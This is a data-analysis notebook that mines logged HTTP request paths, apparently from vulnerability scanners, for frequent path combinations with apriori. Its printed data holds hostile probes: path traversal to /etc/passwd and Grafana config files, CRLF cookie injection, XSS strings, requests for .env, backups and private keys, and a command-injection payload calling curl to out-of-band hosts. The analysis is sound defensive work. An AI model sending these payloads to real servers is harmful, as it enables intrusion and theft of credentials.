#  'c4c30c89-5936-48a2-ad11-9deee5f8be0f': ['/wp-content/plugins/parsi-font/readme.txt',
#   '/api/external/7.0/system.System.get_infos',
#   '/index.php',
#   '/app',
#   '/error.txt',
#   '/web.sql.lz',
#   '/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini',
#   '/weblogin.htm',
#   '/goform/activate_process'],
#  '081b2043-5553-4287-b9ee-4f242aa097c9': ['/wp-content/plugins/page-layout-builder/readme.txt',
#   '/loadfile.lp',
#   '/mgmt/shared/authn/login',
#   '/ibmmq/console/j_security_check',
#   '/',
#   '/test.war',
#   '/data.sql.zip',
#   '/ui/api/v1/global-search/builds',
#   '/wp-content/plugins/wpb-show-core/modules/jplayer_new/jplayer_twitter_ver_1.php',
#   '/api/dp/rptsvcsyncpoint',
#   '/config/initializers/secret_token.rb',
#   '/appmonitor/protected/selector/server_file/files',
#   '/horde/admin/user.php'],
#  '789a60d2-233f-43f2-8059-6f3f4ab1398e': ['/wp-content/plugins/photoxhibit/readme.txt',
#   '/wp-admin/admin-ajax.php',
#   '/Login.aspx',
#   '/manager/html',
#   '/manager/html',
#   '/console/j_security_check',
#   '/css../.git/config',
#   '/www.bz2',
#   '/backup_3.lz',
#   '/ui/jobs',
#   '/',
#   '/defaultroot/officeserverservlet'],
#  'c046c868-9d74-42ba-ae6c-7c50cdfd91f0': ['/',
#   '/solr/admin/cores',
#   '/auth/requestreset',
#   '/manager/html',
#   '/manager/html',
#   '/web.zip',
#   '/api/v4/users/1',
#   '/api/v4/users/48',
#   '/php/movefile.php',
#   '/public/plugins/piechart/../../../../../conf/defaults.ini',
#   '/eam/vib',
#   '/sap/public/info',
#   '...',
#   '/druid/index.html'],
#  '876abd4d-c812-4ea9-8c9e-e00206e81d11': ['/wp-content/plugins/simpel-reserveren/readme.txt',
#   '/_phpmyadmin/index.php',
#   '/log_download.cgi',
#   '/',
#   '/.env.0',
#   '/log_download.cgi',
#   '/////var',
#   '/jbossass/jbossass.jsp',
#   '/vercel.json',
#   '/wp-admin/admin-ajax.php',
#   '/wp-admin/admin-ajax.php'],
#  'd540ab16-ce8b-4df4-b97b-e58349295044': ['/wp-content/plugins/tidio-form/readme.txt',
#   '/hms/user-login.php',
#   '/mgmt/tm/auth/user/tlm92',
#   '/swagger/swagger-ui.js',
#   '/htdocs.tar.bz2',
#   '/api/v4/users/72',
#   '/wp-content/themes/Grimag/go.php'],
#  'cd1f0423-0dcc-4101-9673-a3f9fcef32e9': ['/wp-content/plugins/tidio-gallery/readme.txt',
#   '/manager/html',
#   '/mysqlbackup.sh',
#   '/inetpub.tar.gz',
#   '/db.tar.bz2',
#   '/wp-content/plugins/wpforms-lite/readme.txt',
#   '/public/plugins/marcusolsson-dynamictext-panel/../../../../../conf/defaults.ini',
#   '/index.php',
#   '/',
#   '/server/status',
#   '/sws/index.html',
#   '/overview.html'],
#  '3f5a56dd-e203-46f0-9660-6f03235851be': ['/wp-content/plugins/whizz/readme.txt',
#   '/api/snapshots',
#   '/fw.login.php',
#   '/cyrus.index.php',
#   '/AdminService/urest/v1/LogonResource',
#   '/2025.tar.bz2',
#   '/wwwroot.sql.lz',
#   '/package.7z',
#   '/data.lz',
#   '/https://%0a%0doast.me',
#   '/security.txt'],
#  '7a63b6fd-aac7-47d0-8ac2-d1b5c17d5428': ['/wp-content/plugins/wpsolr-search-engine/readme.txt',
#   '/magmi/web/magmi_saveprofile.php',
#   '/magmi/web/magmi_run.php',
#   '/magmi/web/info.php',
#   '/manager/html',
#   '/console/',
#   '/wp-content/plugins/essential-blocks/readme.txt',
#   '/public_html.tar.bz2',
#   '/conf/conf.sql.7z',
#   '/mdiy/dict/listExcludeApp',
#   '/index.php',
# ...
#   '/OAapp/bfapp/buffalo/workFlowService',
#   '/actuator/configprops',
#   '/',
#   '/nagios'],
#  'fb165860-4891-46ec-b167-f31776a658e8': ['/v3/settings/first-login'],
#  'eeaedd4b-1c13-4a20-80ee-3220bc9fa252': ['/WebConfig/lua/auth.lua',
#   '/etc.children.1.json',
#   '/app.sql.7z',
#   '/admin.sql.tar.z',
#   '/upload.sql.z',
#   '/solr/gettingstarted_shard1_replica_n1/config',
#   '/public/plugins/corpglory-progresslist-panel/../../../../../conf/defaults.ini',
#   '/public/plugins/fastweb-openfalcon-datasource/../../../../../conf/defaults.ini',
#   '/goanywhere/auth/Login.xhtml',
#   '/pmd/index.php',
#   '/visualrf/group_list.xml',
#   '/v1/auth/users'],
#  'ae17d74a-2c08-4984-bd6a-5174704f3a1d': ['/console/',
#   '/.env.www',
#   '/htdocs.tar.gz',
#   '/db.tar.bz2',
#   '/public/plugins/yesoreyeram-infinity-datasource/../../../../../conf/defaults.ini',
#   '/wp-config.php.BAK',
#   '/actuator/scheduledtasks',
#   '/KeepAlive.jsp',
#   '/%3F%0DSet-Cookie%3Acrlfinjection=crlfinjection'],
#  'bc72b5eb-d24f-4827-aac0-19ff9a91ff4d': ['/console/j_security_check',
#   '/',
#   '/ssl/localhost.key',
#   '/db.war',
#   '/',
#   '/v1/app/writeFileSync',
#   '/wxjsapi/saveYZJFile',
#   '/wxjsapi/saveYZJFile',
#   '/wp-content/plugins/sagepay-server-gateway-for-woocommerce/includes/pages/redirect.php',
#   '/widgets/knowledgebase',
#   '/index.php5',
#   '/index.php',
#   '/index.php'],
#  '594cf865-95df-474f-a946-e3d407481cc5': ['/plug/oem/AspCms_OEMFun.asp',
#   '/aplicacao/routes/configs/routes.ini',
#   '/.build.sh',
#   '/upload.sql.gz',
#   '/src.rar',
#   '/settings/settings.py'],
#  '55f1e9c2-27cc-4c10-b9fb-8b3c7558f8ef': ['/am/XUI/Login',
#   '/logs/errors.log',
#   '/public.sql.tar.gz',
#   '/Release.sqlitedb',
#   '/public/plugins/cloudflare-app/../../../../../conf/defaults.ini',
#   '/thruk/cgi-bin/login.cgi',
#   '/hB3jS0DT%22%3E%3Cimg%20src=a%20onerror=alert%28document.domain%29%3E/..CFIDE/administrator/index.cfm',
#   '/mappings',
#   '/////bin///querybuilder.feed',
#   '/Install/InstallWizard.aspx'],
#  '9c3966c6-c710-46da-bfd6-5f3f64ee2135': ['/web/phpmyadmin/',
#   '/api/user/signup/step2',
#   '/wp-content/plugins/envato-elements/readme.txt',
#   '/wp-content/plugins/nextgen-gallery/readme.txt',
#   '/conf/conf.zip',
#   '/public/plugins/nagasudhirpulla-api-datasource/../../../../../conf/defaults.ini',
#   '/general/document/index.php/recv/register/insert',
#   '/systemController/showOrDownByurl.do',
#   '/systemController/showOrDownByurl.do',
#   '/CFIDE/componentutils/login.cfm',
#   '/index.php',
#   '/wp-admin/options-general.php',
#   '/jeecg-boot/actuator/httptrace/',
#   '/jsp/help-sb-download.jsp',
#   '/jsp/help-sb-download.jsp'],
#  '336d75cd-56bb-4678-b3ac-e54dfda91665': ['/phpMyAdmin/',
#   '/app.sql.z',
#   '/phpMyAdmin/scripts/setup.php',
#   '/old.tgz',
#   '/',
#   '/cacti/',
#   '/home/get_products',
#   '/setup.cgi',
#   '/cs/idcplg',
#   '/cs/idcplg'],
#  '2eb4c445-0b07-4da3-b86a-6e2704025ee1': ['/editor/ckeditor/samples/',
#   '/package.sql.tar.gz',
#   '/defaultroot/download_ftp.jsp',
#   '/shop.php',
#   '/files/ldap.debug.txt',
#   '/docker-cloud.yml',
#   '/wp-admin/admin-ajax.php',
#   '/login/login',
#   '/demo/'],
#  '314734a6-21b8-4ffb-a04f-f3f93fae0f94': ['/',
#   '/public/plugins/volkovlabs-image-panel/../../../../../conf/defaults.ini',
#   '/wp-config.php.txt',
#   '/propertyfinder/component/jesectionfinder/',
#   '/propertyfinder/component/jesectionfinder/'],
#  '78022c1f-26c8-418f-b5d5-92dcca30e3dd': ['/',
#   '/db.bz2',
#   '/auth.php',
#   '/_vti_pvt/service.pwd'],
#  '31bbcb49-8210-4488-afc9-43de8421f478': ['/api/swagger-ui.html',
#   '/database.bak',
#   '/127.0.sql.lz',
#   '/backup_2.sql.7z',
#   '/v4/graph',
#   '/index_en.php',
#   '/index.php',
#   '/phpPgAdmin/index.php'],
#  '3ad4f938-dad2-496d-9dfb-7b7acf9c7b24': ['/api-docs/swagger.json',
#   '/website.tar.bz2',
#   '/wp-content/plugins/custom-css-js/readme.txt',
#   '/upload.Z',
#   '/public/plugins/grafana-honeycomb-datasource/../../../../../conf/defaults.ini'],
#  'a08a083b-8c06-496a-9cc1-7855fb1327be': ['/api/doc.json',
#   '/public/plugins/smartmakers-trafficlight-panel/../../../../../conf/defaults.ini',
#   '/login.php',
#   '/login',
#   '/go/admin/pipelines/create',
#   '/upload/mobile/index.php',
#   '/'],
#  '94908cb4-ee1e-409a-b0e0-b29fca35bc17': ['/backup.sql',
#   '/uploads.tar.z',
#   '/api/v4/users/30',
#   '/v4/graphql/schema.yaml',
#   '/spre/auth/login',
#   '/assets/built%252F..%252F..%252F%25E0%25A4%25A/package.json',
#   '/server/node_upgrade_srv.js'],
#  '3721d026-1e12-4ee8-a454-37121f2e34cc': ['/127.0.0.1_db.sql',
#   '/output.sql.bz2',
#   '/ovirt-engine/',
#   '/pdb/dashboard/index.html',
#   '/irj/cache.jsp'],
#  '09a73df3-bacf-490b-9675-147d79544467': ['/127.0.0.1.sql',
#   '/wp-content/plugins/securimage-wp/readme.txt',
#   '/h2-console/login.jsp',
#   '/apimanui/api-manager',
#   '/',
#   '/',
#   '/user/login'],
#  'dda00a12-8ef8-4881-9739-8b71d0989f10': ['/api/application.wadl',
#   '/temp.sql.gz',
#   '/v3/altair',
#   '/2ya6Rtj90Rw2RxdT2ip7yoKUIIb.php',
#   '/cgi-bin/awstats.pl'],
#  '49064be5-80eb-4481-ab76-e1e6bc26ec7f': ['/0.1.Z',
#   '/0.1.tar.z',
#   '/roundcube/logs/sendmail.log',
#   '/html.7z',
#   '/data.xz',
#   '/answer/api/v1/siteinfo',
#   '/forumrunner/request.php',
#   '/nagioslogserver/install'],
#  '73fc0db1-bafa-4450-a8d3-967aed8d698b': ['/0.lz',
#   '/config.sh',
#   '/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini',
#   '/2ya6RuigBARYFlzkgZTgHq4KvLb.txt',
#   '/mainpage/msglog.aspx',
#   '/',
#   '/',
#   '/next.config.js',
#   '/Ajax_url_encode.php'],
#  '12473cc1-93d2-472e-8447-9e01954eb30e': ['/0.sql.gz',
#   '/127.0.sql.z',
#   '/data.sql.tar.gz',
#   '/output.sql.zip',
#   '/upload.sql.lz',
#   '/public/plugins/alexanderzobnin-zabbix-app/../../../../../conf/defaults.ini',
#   '/perpustakaan/index.php/%22--%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E/index.php',
#   '/spreadsheet-reader/test.php',
#   '/spreadsheet-reader/test.php'],
#  '75b03e48-4279-49f1-8b12-52c242bcbf84': ['/127.0.sqlite',
#   '/test.rar',
#   '/api/v4/users/71',
#   '/CFIDE/administrator/images/background.jpg',
#   '/clusters',
#   '/axis/happyaxis.jsp'],
#  '52cd60a9-bcc4-4088-9bd2-096b0932d851': ['/.env_sample',
#   '/backup.rar',
#   '/sphinx-graphiql',
#   '/database.sql.gz',
#   '/jexws/jexws.jsp',
#   '/rest/api/2/resolution'],
#  '373d2b6f-fd0f-4646-885b-3a1bfe0472c3': ['/.env_1',
#   '/db.sql.tar.z',
#   '/admin.sql.lz'],
#  '6e59dcb4-9465-4359-8b1c-f941242035c2': ['/2025.sql.lz',
#   '/www.sql.bz2',
#   '/api/v4/users/52',
#   '/plugins/weathermap/configs/poc.conf',
#   '/',
#   '/index.php/Pan/ShareUrl/downloadSharedFile',
#   '/wp-content/plugins/robotcpa/f.php',
#   '/index.php',
#   '/index.php',
#   '/nacos/v1/console/server/state'],
#  '05cef1df-eb45-481b-b66f-9ebdad8c1637': ['/info.php',
#   '/.children.json',
#   '/////etc.children.json',
#   '/wp-content/plugins/easy-google-fonts/readme.txt',
#   '/v1/submissions',
#   '/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php',
#   '/index.php',
#   '/index.php',
#   '/artemis/1/..;/env'],
#  'ba7c5726-4aee-4877-97fe-9e8cd64c5dae': ['/test.php',
#   '/public_html.7z',
#   '/tmp.sql.rar',
#   '////%3C%3E//oast.me',
#   '/plugins/content/jw_allvideos/includes/download.php',
#   '/plugins/content/jw_allvideos/includes/download.php',
#   '/manage/log/view',
#   '/manage/log/view'],
#  'a8664f72-c66a-4bf1-8062-3f30833be2d0': ['/server.key',
#   '/website.sqlite',
#   '/api/v4/users/15',
#   '/backup_4.sql.xz',
#   '/api/v1/namespaces/default/workflows',
#   '/wp-content/plugins/black-studio-tinymce-widget/readme.txt',
#   '/tmp.sqlitedb',
#   '/',
#   '/',
#   '/kb_view_customer.do'],
#  '5f941be6-76b1-46f1-87bd-022aeaf39672': ['/p.php',
#   '/www.lz',
#   '/php/query.php',
#   '/database.tar',
#   '/db.sql.z',
#   '/old.gz',
#   '/api/2.0/services/usermgmt/password/lystph',
#   '/',
#   '/horizon/api/stats',
#   '/dbconsole/',
#   '/',
#   '/cgi-bin/user/Config.cgi',
#   '/actuator/loggers'],
#  'e12761eb-f571-42f0-b1a9-551d9b051261': ['/2025.sql.xz',
#   '/Release.sql.tar.gz',
#   '/v4/graphiql.min.css',
#   '/ftp.jar',
#   '/wp-content/plugins/wp-reviews-plugin-for-google/readme.txt',
#   '/public/plugins/radensolutions-netxms-datasource/../../../../../conf/defaults.ini',
#   '/logs/downloadMainLog'],
#  'cb75f444-7735-4d47-905e-8993c40c2c3d': ['/2025.sql.tar.gz',
#   '/db.lz',
#   '/StudioServer/server/apps/login.php',
#   '/ServiceCenter/Login.aspx',
#   '/iNotes/Forms5.nsf',
#   '/index.php',
#   '/index.php'],
#  '7d422e04-cfe0-454f-b586-739a5fc1f899': ['/certsrv/',
#   '/wwwroot.sqlite',
#   '/',
#   '/query-api',
#   '/v4/graphql-explorer',
#   '/public/plugins/grafana-mqtt-datasource/../../../../../conf/defaults.ini',
#   '/wp-json/oembed/1.0/proxy',
#   '/api/sms_check.php',
#   '/index.php',
#   '/index.php'],
#  '9a433a9f-c09e-4205-8602-985aac121168': ['/reminder.sh',
#   '/wwwroot.sql.rar',
#   '/bin/wcm/search/gql.json;%0aa.js',
#   '/',
#   '/',
#   '/osclass/oc-admin/index.php',
#   '/osclass/oc-admin/index.php',
#   '/wp-admin/admin-ajax.php'],
#  '07141a82-24a9-46ff-8d01-53d61c630f1e': ['/mail/logs/errors',
#   '/public_html.tgz',
#   '/%0a/oast.me/',
#   '/veracore/Home/',
#   '/smb.conf',
#   '/.tugboat'],
#  'b0876cfb-97c0-4786-be32-fe1fe2a80a5f': ['/127.0.0.1/error.log',
#   '/bin/wcm/search/gql.servlet.json',
#   '/etc.children.json',
#   '/////etc.json',
#   '/sql.Z',
#   '/wp-content/plugins/portrait-archiv-shop/js/imageDetails.php',
#   '/general/mytable/intel_view/video_file.php',
#   '/index.php',
#   '/index.php'],
#  '076428ff-4a82-4e82-bc75-a01a6087b9a0': ['/htdocs.sql.zip',
#   '/wp-content/plugins/pretty-link/readme.txt',
#   '/',
#   '/',
#   '/http://127.0.0.1oast.me',
#   '/',
#   '/cgi-bin/webproc',
#   '/redmine/config/configuration.yml',
#   '/cgi-bin/webproc',
#   '/users/change_emailahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(document.domain)%3eahrixia'],
#  '4a45c7be-66d9-4176-ae07-0acb6ec7f5c1': ['/',
#   '/jbossass/jbossass.jsp',
#   '/services/user/values.xml',
#   '/env.development.js',
#   '/index.php',
#   '/sphinx/sphinx.conf',
#   '/index.php',
#   '/index.php',
#   '/index.php',
#   '/wp-content/plugins/base64-encoderdecoder/base64-decode.php'],
#  'e1bca83e-a170-41d1-945b-a7f0bcd58063': ['/html.tar.bz2',
#   '/webapps.bz2',
#   '/website.sqlitedb',
#   '/backups.tgz',
#   '/v4/graphql/console',
#   '/public/plugins/ntop-ntopng-datasource/../../../../../conf/defaults.ini',
#   '/nagiosql/admin/info.php'],
#  '32a5055f-9c32-46a2-9b8e-d608a828c738': ['/',
#   '/',
#   '/.children.json',
#   '/backup.tar.gz',
#   '/v3/graphql.php',
#   '/public/ticket/ajax/ajax.php',
#   '/',
#   '/phppgadmin/'],
#  '1f81bcb0-224d-4f69-9856-23ebb9095cc3': ['/public.sql.rar',
#   '/public_html.rar',
#   '/glpi/files/',
#   '/ccmadmin/j_security_check',
#   '/',
#   '/404',
#   '/wp-content/plugins/constant-contact-api-old/vendor/constantcontact/constantcontact/test/Json/Auth/token_info.json',
#   '/ajax/apps/manifests'],
#  '6de5a6fb-088d-4f76-886f-41a8729eb053': ['/public.tgz',
#   '/backup_2.Z',
#   '/wp-content/plugins/enable-media-replace/readme.txt',
#   '/inetpub.sql.tar.z',
#   '/wp-content/plugins/metform/readme.txt',
#   '/https://oast.me/https://oast.me/'],
#  '080733d5-adc1-4eb0-900b-235f4da6bea5': ['/test.sql.gz',
#   '/temp.tar',
#   '/admin.tgz',
#   '/static/link/%2e%2e/etc/passwd',
#   '/',
#   '/irj/helper.jsp',
#   '/client/index.php%3F.php/gsb/users.php'],
#  '8483f3c5-8df3-4bee-9c4d-c3c74064a946': ['/backup.sql.tar.gz',
#   '/v4/graphql/schema.json',
#   '/inetpub.sql.tar.gz',
#   '/public/plugins/bessler-pictureit-panel/../../../../../conf/defaults.ini'],
#  '6b449926-0835-4056-a5e8-6dacb9276428': ['/backup_1.lz',
#   '/vendor/htmlawed/htmlawed/htmLawedTest.php',
#   '/backup_3.bz2',
#   '/backups.lz',
#   '/v2/graphiql.php',
#   '/inetpub.sql.z',
#   '/vendor/htmlawed/htmlawed/htmLawedTest.php',
#   '/wp-content/plugins/wp-maintenance-mode/readme.txt',
#   '/old.lz'],
#  '3e9ae72f-0725-4570-bb57-18724ee80b1f': ['/2ya6RpaKMXzHatcjeunoaIAg1Vw.json',
#   '/tmp.sql.xz',
#   '/_search',
#   '/wp-config.php.bak',
#   '/docker-compose.prod.yml',
#   '/index.php',
#   '/index.php',
#   '/common/images/Logo.png',
#   '/cgi-bin/export-cgi'],
#  'eab77a79-076e-4b08-bc2f-e5d3f684cd90': ['/backup_2.db',
#   '/temp.gz',
#   '/wp-content/plugins/facebook-for-woocommerce/readme.txt',
#   '/%20../web-inf/web.xml',
#   '/_vti_bin/lists.asmx'],
#  '0d2ad3d8-0a7f-4a90-9a0e-3ac041143dad': ['/backup_2.sql.rar',
#   '/backup_3.sql.lz',
#   '/conf/conf.xz',
#   '/',
#   '/mlb/',
#   '/mylittlebackup/',
#   '/geoserver/web/'],
#  '081a83f2-1a11-4fc6-9624-81fb9c77b6ac': ['/backup_2.sql.tar.z',
#   '/wp-content/plugins/insert-headers-and-footers/readme.txt',
#   '/wp-content/uploads/2ya6RkVmvXDmOieWjPAyS7vEV7p.php',
#   '/config/properties.ini'],
#  '46bef0d1-1a30-4959-8a20-553a8a434696': ['/CMSPages/Staging/SyncServer.asmx',
#   '/backup_3.sql.rar',
#   '/src.sql.bz2',
#   '/old.db',
#   '/cfmx/CFIDE/scripts/ajax/package/cfajax.js',
#   '/finish-installation/register'],
#  'cd746470-40fb-49c9-9538-9aa2e13903b4': ['/phpMyAdmin%202/server_import.php',
#   '/api/cask/graphql-playground',
#   '/wp-content/plugins/wordpress-importer/readme.txt',
#   '/public/plugins/speakyourcode-button-panel/../../../../../conf/defaults.ini',
#   '/.htaccess',
#   '/OA_HTML/cabo/jsps/a.jsp'],
#  '4b40f693-d258-42de-bb15-8290a5828bdb': ['/seeyon/thirdpartyController.do'],
#  'f5ad433f-bf15-4512-a8db-70b7071b45da': ['/actuator/heapdump',
#   '/public/plugins/grafana-odbc-datasource/../../../../../conf/defaults.ini',
#   '/public/plugins/natel-plotly-panel/../../../../../conf/defaults.ini',
#   '/inventory'],
#  '36a40a2f-a5df-437e-a106-4c0e4d07c911': ['/bak.sql.7z',
#   '/env.test.js',
#   '/Guardfile',
#   '/metrics',
#   '/OA_HTML/bispgraph.jsp%0D%0A.js',
#   '/OA_HTML/bispgraph.jsp%0D%0A.js',
#   '/logs/awstats.pl',
#   '/',
#   '/login',
#   '/cgi-bin/welcome'],
#  '654be38f-a669-4c96-8be8-40017aabc3f4': ['/'],
#  '3fb78ba2-0d07-4d00-a1d8-6c79a20ee1e2': ['/graphql-explorer',
#   '/db.sqlite',
#   '/wp-content/plugins/classic-widgets/readme.txt',
#   '/public/plugins/grafana-opensearch-datasource/../../../../../conf/defaults.ini',
#   '/login_check.php',
#   '/accounts/login'],
#  'f3dbda10-6a03-49c8-9f4d-aca98aa41efb': ['/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt',
#   '/',
#   '/defaultroot/download_old.jsp',
#   '/',
#   '/user/login'],
#  '69d10672-4e1a-40d9-bcc4-8b5b0aef395f': ['/wp-content/plugins/mailchimp-for-woocommerce/readme.txt',
#   '/public/plugins/dlopes7-appdynamics-datasource/../../../../../conf/defaults.ini',
#   '/static/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
#   '/wp-json/',
#   '/dnsmasq.conf',
#   '/login/hostinfo.cgi'],
#  'd106f8a7-5b1f-46cb-8a15-478854b602d1': ['/data.sql.7z',
#   '/public/plugins/woutervh-mapbox-panel/../../../../../conf/defaults.ini',
#   '/studio/login'],
#  '172363c7-4721-4907-8c55-129346705932': ['/wp-content/plugins/ssl-insecure-content-fixer/readme.txt',
#   '/',
#   '/page/exportImport/fileTransfer/2ya6RqOaolrEflQcSiAgPdd0l7e.jsp',
#   '/',
#   '/stats/index.html'],
#  '6fe4d805-c996-4e0a-8930-642628a20bbb': ['/PhoneBackup/2ya6RqMmbwWBbwcgdJtUY9dGxd6.php',
#   '/PhoneBackup/2ya6RqMmbwWBbwcgdJtUY9dGxd6.php'],
#  '036f68c7-57f0-47c9-8ce0-30884ac4965b': ['/hac/login',
#   '/hac/j_spring_security_check',
#   '/hac/',
#   '/hmc/login',
#   '/hac/j_spring_security_check',
#   '/hmc/',
#   '/hmc/j_spring_security_check',
#   '/hmc/j_spring_security_check'],
#  'ed39093a-02bc-4bfb-8420-7496fccbb11e': ['/'],
#  '2499449e-0489-48f5-9aef-7e98a82288bc': ['/', '/', '/', '/'],
#  'e15cdc62-c301-4af2-8f83-3d51df3c82da': ['/public/plugins/embraceio-metric-app/../../../../../conf/defaults.ini',
#   '/perpustakaan/slims/index.php/%22--%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E/index.php',
#   '/index.php',
#   '/index.php'],
#  'a39b6203-4e0e-48af-bdc8-e914fe7d7f9f': ['/sys/ui/sys_ui_component/sysUiComponent.do'],
#  'ae85ecb8-66a3-41a4-a9e5-a9177beb28c2': ['/'],
#  '8da75f9a-7540-4b38-a1a0-faf7a3b47257': ['/'],
#  'b74816aa-bece-451f-aed9-11053b417c16': ['/cgi-bin/jarrewrite.sh'],
#  '76ebbab1-4ce8-4d22-9cc8-d8fbfcc78ce8': ['/client.do'],
#  '8f91d26b-1e8f-4f7f-9b08-d520fb6835f1': ['/index.php'],
#  '4093d760-0a04-436b-a209-c84f0e8a3c23': ['/'],
#  '4c015b2e-836e-4561-9f42-28e860b2d02a': ['/'],
#  '00b5b356-417c-424d-bd46-b2c6050f6f34': ['/nextcloud/login',
#   '/nextcloud/index.php/login'],
#  '5dcaef61-7c23-435d-bda9-9979f5251aca': ['/app/kibana'],
#  '1819e9ec-0031-4aaa-8e60-b831aec70c67': ['/perpustakaan/slims/index.php'],
#  'ca2a20fd-b8dc-48b1-bdc9-f4a43c63f6bd': ['/atmail/webmail/'],
#  'e1e0ca3f-5d67-4bbb-9254-1e8ede816296': ['/new/login']}

# %%
from mlxtend.preprocessing import TransactionEncoder

te = TransactionEncoder()
te_ary = te.fit(paths_matrix).transform(paths_matrix)
df = pd.DataFrame(te_ary, columns=te.columns_)

df
# Out:
#          /  /%00/oast.me/  \
# 0     True          False
# 1     True          False
# 2    False          False
# 3     True          False
# 4     True          False
# ..     ...            ...
# 924  False          False
# 925  False          False
# 926  False          False
# 927  False          False
# 928  False          False
#
#      /%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bcurl,http://d17sqb1q6jvuuc1vrlogspbd7wo6w19r8.oast.live+-H+%27User-Agent:+7TNBDe%27%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bcurl,http://d17sqb1q6jvuuc1vrlogt6gnojofi4bd5.oast.live+-H+%27User-Agent:+7TNBDe%27%7D;  \
# 0                                                False
# 1                                                False
# 2                                                False
# 3                                                False
# 4                                                False
# ..                                                 ...
# 924                                              False
# 925                                              False
# 926                                              False
# 927                                              False
# 928                                              False
#
#      /%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bcurl,http://d17sqb1q6jvuuc1vrlog3ekfnwucn4z9f.oast.live+-H+%27User-Agent:+7TNBDe%27%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bcurl,http://d17sqb1q6jvuuc1vrlogra7rtmj3ezm3d.oast.live+-H+%27User-Agent:+7TNBDe%27%7D;  \
# 0                                                False
# 1                                                False
# 2                                                False
# 3                                                False
# 4                                                False
# ..                                                 ...
# 924                                              False
# 925                                              False
# 926                                              False
# 927                                              False
# 928                                              False
#
#      /%09/oast.me/  /%0A/interact.sh/  /%0ASet-Cookie%3Acrlfinjection/..  \
# 0            False              False                              False
# 1            False              False                              False
# 2            False              False                              False
# 3            False              False                              False
# 4            False              False                              False
# ..             ...                ...                                ...
# 924          False              False                              False
# 925          False              False                              False
# 926          False              False                              False
# 927          False              False                              False
# 928          False              False                              False
#
#      /%0ASet-Cookie:crlfinjection=crlfinjection  \
# 0                                         False
# 1                                         False
# 2                                         False
# 3                                         False
# 4                                         False
# ..                                          ...
# 924                                       False
# 925                                       False
# 926                                       False
# 927                                       False
# 928                                       False
#
#      /%0D%0ASet-Cookie:crlfinjection=crlfinjection  \
# 0                                            False
# 1                                            False
# 2                                            False
# 3                                            False
# 4                                            False
# ..                                             ...
# 924                                          False
# 925                                          False
# 926                                          False
# 927                                          False
# 928                                          False
#
#      /%0DSet-Cookie:crlfinjection=crlfinjection  ...  /zimbraAdmin/  \
# 0                                         False  ...          False
# 1                                         False  ...          False
# 2                                         False  ...          False
# 3                                         False  ...          False
# 4                                         False  ...          False
# ..                                          ...  ...            ...
# 924                                       False  ...          False
# 925                                       False  ...          False
# 926                                       False  ...          False
# 927                                       False  ...          False
# 928                                       False  ...          False
#
#      /zimbraAdmin/0MVzAe6pgwe5go1D.jsp   /zm/  /zm/index.php  \
# 0                                False  False          False
# 1                                False  False          False
# 2                                False  False          False
# 3                                False  False          False
# 4                                False  False          False
# ..                                 ...    ...            ...
# 924                              False  False          False
# 925                              False  False          False
# 926                              False  False          False
# 927                              False  False          False
# 928                              False  False          False
#
#      /zms/admin/index.php  /zp-core/setup/index.php  \
# 0                   False                     False
# 1                   False                     False
# 2                   False                     False
# 3                   False                     False
# 4                   False                     False
# ..                    ...                       ...
# 924                 False                     False
# 925                 False                     False
# 926                 False                     False
# 927                 False                     False
# 928                 False                     False
#
#      /zp/zp-core/setup/index.php  /ztp/cgi-bin/handler  /~projects  \
# 0                          False                 False       False
# 1                          False                 False       False
# 2                          False                 False       False
# 3                          False                 False       False
# 4                          False                 False       False
# ..                           ...                   ...         ...
# 924                        False                 False       False
# 925                        False                 False       False
# 926                        False                 False       False
# 927                        False                 False       False
# 928                        False                 False       False
#
#      /~sicom/mgrng/LoginForm.php
# 0                          False
# 1                          False
# 2                          False
# 3                          False
# 4                          False
# ..                           ...
# 924                        False
# 925                        False
# 926                        False
# 927                        False
# 928                        False
#
# [929 rows x 6304 columns]

# %%
from mlxtend.frequent_patterns import apriori

freq_itemsets = apriori(df, use_colnames=True, min_support=0.005)

freq_itemsets
# Out:
#       support                                           itemsets
# 0    0.500538                                                (/)
# 1    0.005382                                            (/.env)
# 2    0.034446                         (/CDGServer3/SystemConfig)
# 3    0.011841                        (/Users/authenticatebyname)
# 4    0.006459                      (/_ignition/execute-solution)
# ..        ...                                                ...
# 121  0.005382                        (/, /manager/html, /login/)
# 122  0.020452       (/, /manager/html, /wp-admin/admin-ajax.php)
# 123  0.005382  (/manager/html, /CDGServer3/SystemConfig, /ind...
# 124  0.005382                (/manager/html, /login, /index.php)
# 125  0.005382  (/manager/html, /wp-admin/admin-ajax.php, /ind...
#
# [126 rows x 2 columns]

# %%
freq_itemsets['length'] = freq_itemsets['itemsets'].apply(lambda x: len(x))
freq_itemsets
# Out:
#       support                                           itemsets  length
# 0    0.500538                                                (/)       1
# 1    0.005382                                            (/.env)       1
# 2    0.034446                         (/CDGServer3/SystemConfig)       1
# 3    0.011841                        (/Users/authenticatebyname)       1
# 4    0.006459                      (/_ignition/execute-solution)       1
# ..        ...                                                ...     ...
# 121  0.005382                        (/, /manager/html, /login/)       3
# 122  0.020452       (/, /manager/html, /wp-admin/admin-ajax.php)       3
# 123  0.005382  (/manager/html, /CDGServer3/SystemConfig, /ind...       3
# 124  0.005382                (/manager/html, /login, /index.php)       3
# 125  0.005382  (/manager/html, /wp-admin/admin-ajax.php, /ind...       3
#
# [126 rows x 3 columns]

# %%
freq_itemsets[freq_itemsets["length"] >= 3]
# Out:
#       support                                           itemsets  length
# 114  0.005382          (/, /CDGServer3/SystemConfig, /index.php)       3
# 115  0.012917       (/, /manager/html, /CDGServer3/SystemConfig)       3
# 116  0.006459                         (/, /_session, /index.php)       3
# 117  0.005382                            (/, /login, /index.php)       3
